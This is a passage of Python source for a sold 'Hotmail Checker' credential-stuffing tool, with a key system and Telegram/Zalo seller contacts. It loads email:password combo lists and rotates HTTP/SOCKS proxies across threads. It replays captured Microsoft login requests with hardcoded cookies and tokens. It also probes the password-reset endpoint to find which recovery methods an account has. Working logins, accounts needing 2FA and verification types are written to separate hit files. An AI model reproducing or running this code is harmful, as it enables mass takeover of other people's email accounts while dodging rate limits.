                        post_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DVvlPB7EWmxzlTVcW7vWcYEFXN0%218g4kVyMoQ3dZRZDd6kxf*M2rX5siBABm6uIj%21G10W8q8L3ZR*Osce8fvGYURbydDmpRgmZkAivFpTwrq9gSCcO1Qblar21MAYvLsPbu9K63KwCOCozAN1vGVpXPXrWUDknCSNyxOc60sBXsd6EjXCfuxo5w9K%21kEjYRiuA%24%24&PPSX=Pas&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=116863"
                        requests_0 = requests.post(url=u,data=post_data,headers=headers_0,proxies=proxiesx,timeout=10)
                        if ("BF:true,BI:false,sErrTxt" in requests_0.text):
                            self.checkertotal += 1
                            self.bad += 1
                        elif ("account.live.com/identity/" in requests_0.text) or ("account.live.com/pipl/" in requests_0.text) or ("account.live.com/proofs" in requests_0.text):
                            open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Identify.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                            self.checkertotal += 1
                            self.identify += 1
                            free_print(f'\033[38;2;255;165;0m[~]Identity: {email}:{pwd}\033[0m')
                        elif ("com/recover?" in requests_0.text) or ("',CW:true" in requests_0.text) or ("/Confirm?" in requests_0.text) or ("/cancel?" in requests_0.text) or ("/Abuse?" in requests_0.text):
                            open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/2Fa.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                            self.checkertotal += 1
                            self.mfa += 1
                            free_print(f'\033[38;2;255;165;0m[~]2Fa: {email}:{pwd}\033[0m')
                        elif ("https://login.live.com/oauth20_desktop.srf" in requests_0.url) or ("client_info=" in requests_0.url):
                            open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Hit.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                            self.checkertotal += 1
                            self.hits += 1
                            free_print(f'\033[1;32;40m[~]Hit: {email}:{pwd}\033[0m')
                        else:
                            self.checkertotal += 1
                            self.bad += 1
                    else:
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                        self.checkertotal += 1
                        self.error += 1
                except:
                    self.retries += 1
                    self.runcheck(email,pwd,prxx,proxytype)
        def load_combo(self):
            try:
                file_name = input("Enter file name (with extension, e.g., sample.txt): ")
                with open(file_name, 'r', encoding='utf-8') as readFile:
                    self.data = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Combos: \033[1;31;40m{len(self.data)}\033[0m")
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def load_proxy(self):
            try:
                pr1 = input("Enter Proxy List file name (with extension, e.g., proxies.txt): ")  # Yêu cầu người dùng nhập tên tệp
                with open(pr1, 'r', encoding='utf-8') as readFile:  # Mở tệp theo tên được nhập
                    self.prx1 = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Proxies: \033[1;31;40m{len(self.prx1)}\033[0m\n")
                print(f'''\033[1;32;40m1:HTTP/s
        2:SOCKS4
        3:SOCKS5\033[0m''')
                choice = input('==> ')
                if choice == '1':
                    self.proxytype = 'http'
                elif choice == '2':
                    self.proxytype = 'socks4'
                elif choice == '3':
                    self.proxytype = 'socks5'
                else:
                    print('Vui lòng chọn một số hợp lệ như 1, 2 hoặc 3!')
                    time.sleep(1)
                    self.load_proxy()
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def runTools(self,thread_step,thread_count):
            try:
                for i in range(thread_step,len(self.data),thread_count):
                    username = self.data[i].strip()
                    if not ":" in username:
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(username+"\n")
                        self.checkertotal += 1
                        self.error += 1
                    else:
                        acc = username.split(":")
                        mail = acc[0]
                        pwd = acc[1]
                        self.runcheck(mail,pwd,self.prx1,self.proxytype)
            except:
                self.runcheck(username,"",self.prx1,self.proxytype)
        def main(self):
            os.system(f'title Hotmail Checker v3.15.0 - t.me/userbtd - Key:[{key}] - Remain Time:[{days}]')
            print(logo)
            try:
                os.mkdir('Output')
            except:
                pass
            try:
                save = os.mkdir(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}")
            except Exception as errors:
                pass
            time.sleep(0.8)
            self.load_combo() 
            self.load_proxy() 
            self.thread_count = int(input('Thread: '))
            self.start = time.time()
            threading.Thread(target = self.cpm_counter, daemon=True).start()
            threading.Thread(target = self.update_title, daemon=True).start()
            threading.Thread(target = self.phantramdachay, daemon=True).start()
            time.sleep(0.1)
            clear()  
            print(logo)
            threads = []
            check = [0 for i in range(self.thread_count)]
            for x in range(self.thread_count):
                newThread = threading.Thread(target=self.runTools,args=(x,self.thread_count,))
                newThread.start()
            for t in threads:
                t.join()
            input('')
            os.system('pause>Log.txt')
    if __name__ == '__main__':
            x = Hotmail()
            x.main()

#methods verify api 1
def hotmail_verify():
    clear()
    class Hotmail:
        def __init__(self):
            self.data = []
            self.prx1 = []
            self.hits, self.checkertotal, self.mfa, self.sms, self.bad, self.error, self.retries, self.cpm, self.phantram = 0, 0, 0, 0, 0, 0, 0, 0, 0
        def cpm_counter(self):
            while True:
                previous = self.checkertotal
                time.sleep(4)
                after = self.checkertotal
                self.cpm = (after-previous) * 15
        def phantramdachay(self):
            while True:
                checked = self.checkertotal
                total = len(self.data)
                phantram1 = round(checked / total * 100)
                self.phantram = (phantram1)
        def update_title(self):
            while True:
                elapsed = time.strftime('%H : %M : %S', time.gmtime(time.time() - self.start))
                os.system('title Hotmail - Checked: %s/%s (%s%s) ^| Verify Phone: %s ^| Verify Email: %s ^| Verify Sms: %s ^| Bad: %s ^| Retries: %s ^| Error: %s ^| CPM: %s ^| %s' % (self.checkertotal, len(self.data), self.phantram ,"%", self.hits, self.mfa,  self.sms,self.bad, self.retries, self.error, self.cpm, elapsed, ))
                time.sleep(0.4)
        def runcheck(self,email,pwd,prxx,proxytype):
            try:
                proxiesx = {
                    'http': proxytype+'://'+str(random.choice(prxx).strip()),
                    'https': proxytype+'://'+str(random.choice(prxx).strip()),
                }
                if ('@outlook' in email) or ('@hotmail' in email) or ('@live' in email) or ('@msn' in email):
                    head = {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    }
                    url = 'https://account.live.com/ResetPassword.aspx?mn='+email
                    check = requests.get(url=url,proxies=proxiesx,timeout=5).text
                    if ("Ref A" in check):
                        self.retries += 1
                        print(f'[~]Retries: {email}:{pwd}')
                        self.runcheck(email,pwd,prxx,proxytype)
                    elif ('"type":"Sms"' in check):
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Verify_Sms.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                        self.checkertotal += 1
                        self.sms += 1
                        free_print(f'[~]Verify Sms: {email}:{pwd}')
                    elif ('"type":"Email"' in check):
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Verify_Email.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                        self.checkertotal += 1
                        self.mfa += 1
                        free_print(f'[~]Verify Email: {email}:{pwd}')
                    elif ('"type":"SQSA"' in check):
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Verify_Phone.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                        self.checkertotal += 1
                        self.hits += 1
                        free_print(f'[~]Verify Phone: {email}:{pwd}')
                    else:
                        self.checkertotal += 1
                        self.bad += 1
                        free_print(f'[~]Bad: {email}:{pwd}')
                else:
                    open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                    self.checkertotal += 1
                    self.error += 1
                    print(f'[+]Format_Error {email}:{pwd}')
            except:
                self.retries += 1
                print(f'[~]Retries {email}:{pwd}')
                self.runcheck(email,pwd,prxx,proxytype)
        def load_combo(self):
            try:
                file_name = input("Enter file name (with extension, e.g., sample.txt): ")
                with open(file_name, 'r', encoding='utf-8') as readFile:
                    self.data = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Combos: \033[1;31;40m{len(self.data)}\033[0m")
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def load_proxy(self):
            try:
                pr1 = input("Enter Proxy List file name (with extension, e.g., proxies.txt): ")  # Yêu cầu người dùng nhập tên tệp
                with open(pr1, 'r', encoding='utf-8') as readFile:  # Mở tệp theo tên được nhập
                    self.prx1 = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Proxies: \033[1;31;40m{len(self.prx1)}\033[0m\n")
                print(f'''\033[1;32;40m1:HTTP/s
        2:SOCKS4
        3:SOCKS5\033[0m''')
                choice = input('==> ')
                if choice == '1':
                    self.proxytype = 'http'
                elif choice == '2':
                    self.proxytype = 'socks4'
                elif choice == '3':
                    self.proxytype = 'socks5'
                else:
                    print('Vui lòng chọn một số hợp lệ như 1, 2 hoặc 3!')
                    time.sleep(1)
                    self.load_proxy()
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def runTools(self,thread_step,thread_count):
            try:
                for i in range(thread_step,len(self.data),thread_count):
                    username = self.data[i].strip()
                    if not ":" in username:
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(username+"\n")
                        self.checkertotal += 1
                        self.error += 1
                    else:
                        acc = username.split(":")
                        mail = acc[0]
                        pwd = acc[1]
                        self.runcheck(mail,pwd,self.prx1,self.proxytype)
            except:
                self.runcheck(username,"",self.prx1,self.proxytype)
        def main(self):
            os.system(f'title Hotmail Checker v3.15.0 - t.me/userbtd - Key:[{key}] - Remain Time:[{days}]')
            print(logo)
            try:
                os.mkdir('Output')
            except:
                pass
            try:
                save = os.mkdir(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}")
            except Exception as errors:
                pass
            time.sleep(0.8)
            
            self.load_combo() 
            self.load_proxy() 
            self.thread_count = int(input('Thread: '))
            self.start = time.time()
            threading.Thread(target = self.cpm_counter, daemon=True).start()
            threading.Thread(target = self.update_title, daemon=True).start()
            threading.Thread(target = self.phantramdachay, daemon=True).start()
            time.sleep(0.1)
            clear() 
            print(logo) 
            threads = []
            check = [0 for i in range(self.thread_count)]
            for x in range(self.thread_count):
                newThread = threading.Thread(target=self.runTools,args=(x,self.thread_count,))
                newThread.start()
            for t in threads:
                t.join()
            input('')
            os.system('pause>Log.txt')
    if __name__ == '__main__':
            x = Hotmail()
            x.main()

#methods verify api 2
def hotmail_verify_1():
    clear()
    class Hotmail:
        def __init__(self):
            self.data = []
            self.prx1 = []
            self.hits, self.checkertotal, self.bad, self.error, self.retries, self.cpm, self.phantram = 0, 0, 0, 0, 0, 0, 0
        def cpm_counter(self):
            while True:
                previous = self.checkertotal
                time.sleep(4)
                after = self.checkertotal
                self.cpm = (after-previous) * 15
        def phantramdachay(self):
            while True:
                checked = self.checkertotal
                total = len(self.data)
                phantram1 = round(checked / total * 100)
                self.phantram = (phantram1)
        def update_title(self):
            while True:
                elapsed = time.strftime('%H : %M : %S', time.gmtime(time.time() - self.start))
                os.system('title Hotmail - Checked: %s/%s (%s%s) ^| Veryphone: %s ^| Bad: %s ^| Retries: %s ^| Error: %s ^| CPM: %s ^| %s' % (self.checkertotal, len(self.data), self.phantram ,"%", self.hits, self.bad, self.retries, self.error, self.cpm, elapsed, ))
                time.sleep(0.4)
        def runcheck(self,email,pwd,prxx,proxytype):
            try:
                proxiesx = {
                    'http': proxytype+'://'+random.choice(prxx).strip(),
                    'https': proxytype+'://'+random.choice(prxx).strip(),
                }
                if ('@outlook' in email) or ('@hotmail' in email) or ('@live' in email) or ('@msn' in email):
                    #sesion
                    session = requests.session()
                    #requests 1
                    headers_0 = {
                        "Host": "login.live.com",
                        "Connection": "keep-alive",
                        "Cache-Control": "max-age=0",
                        "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Microsoft Edge\";v=\"114\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-ch-ua-platform-version": "\"15.0.0\"",
                        "Upgrade-Insecure-Requests": "1",
                        "Origin": "https://login.live.com",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "Sec-Fetch-Site": "same-origin",
                        "Sec-Fetch-Mode": "navigate",
                        "Sec-Fetch-User": "?1",
                        "Sec-Fetch-Dest": "document",
                        "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=1f907974-e22b-4810-a9de-d9647380c97e&scope=xboxlive.signin+openid+profile+offline_access&redirect_uri=https%3a%2f%2fwww.xbox.com%2fauth%2fmsa%3faction%3dloggedIn%26locale_hint%3den-US&response_type=code&state=eyJpZCI6ImYwYTIxMTYyLWZiMGYtNGI4Mi1iMzFiLTJmNDM1NGVkNzQyZSIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7chttps%253A%252F%252Fwww.xbox.com%252Fen-US%252Flive&response_mode=fragment&nonce=c7cca0cc-0c2c-44e0-b07c-20a6d4c58402&prompt=login&code_challenge=4a2UBSsbXv5UCQEc9PoOlWWvx9fTkdf-fuUbVaTu-8M&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=2.32.2&uaid=86c61a01bba14152b4b005c4961050d9&msproxy=1&issuer=mso&tenant=consumers&ui_locales=en-US&client_info=1&epct=PAQABAAEAAAD--DLA3VO7QrddgJg7Wevr4gPkmRA8UPDGu3gtYFBDFZo8v4ptAu5KPEHMz1QLpaTKmZlK_NlRdtV9iHKrknTrcux_q86TKDqXAw7L2nqNujv5yLMvu8491qEZ-x4ygO5zeJwzAt8o-nTvS_uaqyPgnJAFTBzKj8BxUpAEYnSC71YrJi3IPLGIQrsUXfuPA7m_VsqxAvMdL_MT-wusAaO_iOYsqnkALAIvHu5OWiQkViAA&jshs=0",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Cookie": "DIDC=ct%3D1688550809%26hashalg%3DSHA256%26bver%3D45%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C105_BAY.CZlSgKB7HCnXJfIA9wxkrkGrIXEqIkIew5YR/smw6kwi0DbJClqZ4VlZ3o2TTX1qwpP7yd3mk7fuyeeWTqj4BFoFsvz76/mr6Oa7VYS7xMDZIIJa3uz58cDc83ItZQ2G93yfOvOEjdK12kw0r50WzmzFxzmVhZ81hzOyGFlmtEfRwGYPHZ8oP54nfF/Auvjbsl42NKmRD0qW0JJFp5bm8nWU4u1lWdTP/R97jj0r%252BeubRmXvYP5CUwFbCDWShtTtoMce/AUcu6C0wsiFj%252Bczij12q4ae0gjfqW%252BDiVlLKvbjxnXn5CRnmPfkeS80LNPu5fbesAxK5QAdRdU/nxnM%252BHXf/vkdDRr8/pQ9in7JFB6ipIGUJ2OFPeFXbT4mY8HSaWN4rc1ZD/TIGcAqT/MXKBjKOwVfat9YvZgdo5cQ2YoCEy2LXp0nsOdJjH7qgeru7Su5DMc3Lft8qC3O7n36LzOFt2ft/zKApA7YH%252ByXciJJCHGQfM0fHgav26bBRepfMD9MrOw5NAG/to9LSDY%252BTSI%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DsVYf5DzmipW78ILhJdeZV0Z3JsrNC%252FPY%26hash%3DklWMDbHqzjSN7HqRpGNmaxFpOI4uqOjMOhvtc7O92FE%253D%26dd%3D1;DIDCL=ct%3D1688550809%26hashalg%3DSHA256%26bver%3D45%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C105_BAY.CZlSgKB7HCnXJfIA9wxkrkGrIXEqIkIew5YR/smw6kwi0DbJClqZ4VlZ3o2TTX1qwpP7yd3mk7fuyeeWTqj4BFoFsvz76/mr6Oa7VYS7xMDZIIJa3uz58cDc83ItZQ2G93yfOvOEjdK12kw0r50WzmzFxzmVhZ81hzOyGFlmtEfRwGYPHZ8oP54nfF/Auvjbsl42NKmRD0qW0JJFp5bm8nWU4u1lWdTP/R97jj0r%252BeubRmXvYP5CUwFbCDWShtTtoMce/AUcu6C0wsiFj%252Bczij12q4ae0gjfqW%252BDiVlLKvbjxnXn5CRnmPfkeS80LNPu5fbesAxK5QAdRdU/nxnM%252BHXf/vkdDRr8/pQ9in7JFB6ipIGUJ2OFPeFXbT4mY8HSaWN4rc1ZD/TIGcAqT/MXKBjKOwVfat9YvZgdo5cQ2YoCEy2LXp0nsOdJjH7qgeru7Su5DMc3Lft8qC3O7n36LzOFt2ft/zKApA7YH%252ByXciJJCHGQfM0fHgav26bBRepfMD9MrOw5NAG/to9LSDY%252BTSI%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DsVYf5DzmipW78ILhJdeZV0Z3JsrNC%252FPY%26hash%3DklWMDbHqzjSN7HqRpGNmaxFpOI4uqOjMOhvtc7O92FE%253D%26dd%3D1;IgnoreCAW=1; MSCC=14.189.145.40-VN; MicrosoftApplicationsTelemetryDeviceId=22270d7d-242c-4c94-a477-88a78a3449b9; mkt=en-US; MSPRequ=id=N&lt=1688550783&co=0; uaid=86c61a01bba14152b4b005c4961050d9; OParams=11O.DaPIwYF6F9D9U*W0n5LUcr0gMvlnVY!IZqnyWpH9m9k!cyM5yY22uaREdbJiSGj2Q!IBpexbXxXQfqouXgdC13ATcmjDGds3sAnU1AXM28LoHcxZcK!paX5yaFhI6Q*P!RDg8bYTXh4BlVg0M7vJfSV3qblO9P!oyLjsG5OMYtnjzG3QUzFZvEwfbAjwrnqxNddPBpUP5KM3GtpRN7Nlf1QBmbBn7u8zCfSAMGc0glHdNkmnKRdHjk5fV88CeggoGt13G*FaXn*5noFxP39JTBYCEYucDfO1izSYuZiM11KAkIr40*yry6l828xR3lR1VtN!i9pmXlc8xE5CyLlIIoTGxlSTmnwGQgciOZpoCLNeCUjp8*fzDQP820itk*9PUzCcp4c4pc7uOnCDVpR2i*MMrZd72!qQfWXgHjiJRd6cAchq9bmR*0tTBs5yCnYZt*9QCLJqLh1JnAutqMUfSE3i4oSTZ1rs9dXkVuumbCYLbcg4xUIpUuWS3QnJ7pDmNcOg29zmuM0S7BEpT4xAPjOHTA4tzQLF2qSmVu9fxcmhPOlFOImuXKDZQny974JTEGq9R3nvb*SPO0PBB0HhpwI4C9Pr*YPAzdD6blMIwAujpvRGWyvYe9Ae4pDpUzy*vGMBesPzL*xOf5WFy8KUKBxsDaD0KuVSK61xvpDFbOfLhv7EUmgKidecrE6!DMVRCkDwqpdnmposJdMiRS1VlrE4WjLAgoB8AhQ047hecBztV2Ctp*GwHoSjt6yrWAi!Zw5grxxOJ2UdTD8JCKHld9rq7yS*P11IRJWRKMAdlbGwgAETEDFBqMHI4m3wBo*55*zJZfnaKWSvKvsSVqlFH4oYOk*DIAIiPXHuguMhylQAd68Y6skyoqa0F9wdL1t0AGpTAZ0Gk8csBNcjsxJCz!0HPBgRtHG5g9bU1gjqTWKvuoGhEmYOBwUbD1ulw6K82d8kPdh081vsrun9mlx1TxtB1HoOS18EE*OkJdrohQHHcJVNFHBBJWSnfekKk6c!LbrvRgAZGTC5KFyZCQ6aMc8fDb83y*kMXHPorsoFDPrjSGlwlNipJ9*ukzi6cmxmZeWwzQu4UJzuseX5lstarjYr8PqBzWdTBe!viLM8kSAZwtGnUGlznIZr30oaOh1Hkpy*tWDh8AYklSFip4yUQ9464NTbjIwK8kTnJuxjyuQR2bJj990kvZnLeOMK1oErtj*967*3TLwxG38kjVViZdd9chIupzXyEx7BJyiDtl4P8KRNshJa3ONQpupjxb3ykhImuh739nz3ySNZP83OFrEJCFT15v94vvHFdmqd2fgwIlRn3*bo8nNRRm2FcYhLcxsqcG0Ix!6z3iwy5XAWbu!lie6x6OACgx0oGdI3dc36K872yL8tuDvd49JkD6ZQPrIs!wTkSp9wpLSOSKJh3geVZ84zJQ51pRSdy!gtDfh7o724XJGTvvOT4f4PtM307XVCQFQcRO*XqQTPKuuiIezD3mvJ9SXoDsFfsiTnvZhZZXD*DqKy!U77jRa!LUjJxyBvgo83kPhihTscLbov43AqTfygqb7kUl3506FGAP*JyG7s9n7bBxwtFqX2JquX4*4c6OJ3SHYtAaiNTanfMIv5A5QCz05JGtzCBXZy8fYarmSqHl037cSwQNSPT!dezJZlmE3mjkFMVOfexAyD69X5dnoY3pCZUhJKGvRnP6*u9LSNkfI!Nl2s6*ZDyGJ1mojUqWZByJmUM5!H20mson4$; ai_session=65Um7Be9HmEKy7d1b/osPQ|1688556260254|1688558071580; MSPOK=$uuid-96d614d6-8cc6-4b05-b08a-a71c361a2883$uuid-c0991d78-1963-4015-9dbb-18ea7995cbb0; wlidperf=FR=L&ST=1688558095992",
                        "Accept-Encoding": "gzip, deflate",
                        "Content-Length": "572",
                    }
                    payload = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pwd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DQiUHfXr9oDK1vjYD97mSERoHiZtuv1AI0qV8OfQuLljBAPu7BERfadTAH4PNcl1aRwS3i64y9S8VxOATaL%210Em6geafAB2E864k5WMlNojizGoa3azBwGYIyspjQFA%2148MHR7a*pJIaieOvhT11zXkh4%21H%21YxWGCAXSFEwkqW53HX5rrlU6imR3p*PhW1*ulg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=25028'
                    u = 'https://login.live.com/ppsecure/post.srf?client_id=1f907974-e22b-4810-a9de-d9647380c97e&contextid=FA2E94C647D9BAFE&opid=532FF5E2569A8AEE&bk=1688550783&uaid=86c61a01bba14152b4b005c4961050d9&pid=15216'
                    requests_1 = session.post(url=u,data=payload,headers=headers_0,proxies=proxiesx,timeout=5).text
                    #key check
                    if ('tried to sign in too many times with an incorrect account or password' in requests_1) or ('BD:true,BE:true,BH:false,sErrTxt:' in requests_1):
                        self.retries += 1
                        self.runcheck(email,pwd,prxx,proxytype)
                    elif ('account.live.com/recover' in requests_1) or ('account.live.com/identity' in requests_1) or ('Email/Confirm?' in requests_1) or ("',CW:true" in requests_1) or ('/cancel?' in requests_1) or ('/Abuse?' in requests_1):
                        #requests 2
                        headers_1 = {
                            "Content-Type": "application/x-www-form-urlencoded",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                            "Pragma": "no-cache",
                            "Accept": "*/*",
                        }
                        try:
                            u_1 = requests_1.split('id="fmHF" action="')[1].split('"')[0]
                            ipt = requests_1.split('id="ipt" value="')[1].split('"')[0]
                            pprid = requests_1.split('id="pprid" value="')[1].split('"')[0]
                            uaid = requests_1.split('id="uaid" value="')[1].split('"')[0]
                            post_data = f"uaid={uaid}&ipt={ipt}&pprid={pprid}"
                            requests_2 = session.post(url=u_1,data=post_data,headers=headers_1,proxies=proxiesx,timeout=5).text
                            if ('{"collectPhone":{"url":"https://account.live.com/API/ac/CollectPhone","apiId":' in requests_2) or ('live.com/API/ac/CollectPhone' in requests_2):
                                open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Hits.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                                self.checkertotal += 1
                                self.hits += 1
                                print(f'\033[1;32;40m[~]Veryphone: {email}:{pwd}\033[0m')
                            else:
                                self.checkertotal += 1
                                self.bad += 1
                        except:
                            self.checkertotal += 1
                            self.bad += 1
                    else:
                        self.checkertotal += 1
                        self.bad += 1
                else:
                    open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(email +':'+pwd+"\n")
                    self.checkertotal += 1
                    self.error += 1
                    print(f'[+]Format_Error {email}:{pwd}')
            except:
                self.retries += 1
                self.runcheck(email,pwd,prxx,proxytype)
        def load_combo(self):
            try:
                file_name = input("Enter file name (with extension, e.g., sample.txt): ")
                with open(file_name, 'r', encoding='utf-8') as readFile:
                    self.data = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Combos: \033[1;31;40m{len(self.data)}\033[0m")
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def load_proxy(self):
            try:
                pr1 = input("Enter Proxy List file name (with extension, e.g., proxies.txt): ")  # Yêu cầu người dùng nhập tên tệp
                with open(pr1, 'r', encoding='utf-8') as readFile:  # Mở tệp theo tên được nhập
                    self.prx1 = readFile.readlines()
                print(f"[+]\033[1;32;40m Loaded Proxies: \033[1;31;40m{len(self.prx1)}\033[0m\n")
                print(f'''\033[1;32;40m1:HTTP/s
        2:SOCKS4
        3:SOCKS5\033[0m''')
                choice = input('==> ')
                if choice == '1':
                    self.proxytype = 'http'
                elif choice == '2':
                    self.proxytype = 'socks4'
                elif choice == '3':
                    self.proxytype = 'socks5'
                else:
                    print('Vui lòng chọn một số hợp lệ như 1, 2 hoặc 3!')
                    time.sleep(1)
                    self.load_proxy()
            except Exception as errors:
                print(errors)
                input()
                sys.exit()
        def runTools(self,thread_step,thread_count):
            try:
                for i in range(thread_step,len(self.data),thread_count):
                    username = self.data[i].strip()
                    if not ":" in username:
                        open(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}/Format_Error.txt", "a", encoding="utf-8").write(username+"\n")
                        self.checkertotal += 1
                        self.error += 1
                    else:
                        acc = username.split(":")
                        mail = acc[0]
                        pwd = acc[1]
                        self.runcheck(mail,pwd,self.prx1,self.proxytype)
            except:
                self.runcheck(username,"",self.prx1,self.proxytype)
        def main(self):
            os.system(f'title Hotmail Checker v3.15.0 - t.me/userbtd - Key:[{key}] - Remain Time:[{days}]')
            print(logo)
            try:
                os.mkdir('Output')
            except:
                pass
            try:
                save = os.mkdir(f"./Output/Result {day.strftime('%d-%m-%y %I-%M-%S')}")
            except Exception as errors:
                pass
            time.sleep(0.8)
            
            self.load_combo() 
            self.load_proxy() 
            self.thread_count = int(input('Thread: '))
            self.start = time.time()
            threading.Thread(target = self.cpm_counter, daemon=True).start()
            threading.Thread(target = self.update_title, daemon=True).start()
            threading.Thread(target = self.phantramdachay, daemon=True).start()
            time.sleep(0.1)
            clear() 
            print(logo) 
            threads = []
            check = [0 for i in range(self.thread_count)]
            for x in range(self.thread_count):
                newThread = threading.Thread(target=self.runTools,args=(x,self.thread_count,))
                newThread.start()
            for t in threads:
                t.join()
            input('')
            os.system('pause>Log.txt')
    if __name__ == '__main__':
            x = Hotmail()
            x.main()

def checker_choice():
    clear()
    print('1: Hotmail.com Search\n2: Hotmail.com Checker')
    choice = input('==> ')
    if choice == '1':
        hotmail_search()
    elif choice == '2':
        only_show_hit_custom()
    else:
        print('Vui lòng chọn một số hợp lệ như 1,2 hoặc 3!')
        time.sleep(1)
        clear()
        sys.exit()
#main
def verify_choice():
    clear()
    print('1: Verify Api 1\n2: Verify Api 2')
    choice = input('==> ')
    if choice == '1':
        hotmail_verify()
    elif choice == '2':
        hotmail_verify_1()
    else:
        print('Vui lòng chọn một số hợp lệ như 1,2 hoặc 3!')
        time.sleep(1)
        clear()
        sys.exit()
def howtouse():
     clear()
     print('PM')
     print('''zalo/0338592980
telegram: t.me/userbtd      ''')
     input()
     print('Bye !')
     time.sleep(3)
     sys.exit()
def main():
    os.system(f'title Hotmail Checker v3.15.0 - t.me/userbtd - Key:[{key}] - Remain Time:[{days}]')
    print(logo)
    print('''1:\033[1;32;40mCHECKER HOTMAIL\033[0m
2:\033[1;32;40mCHECKER HOTMAIL VERIFY\033[0m
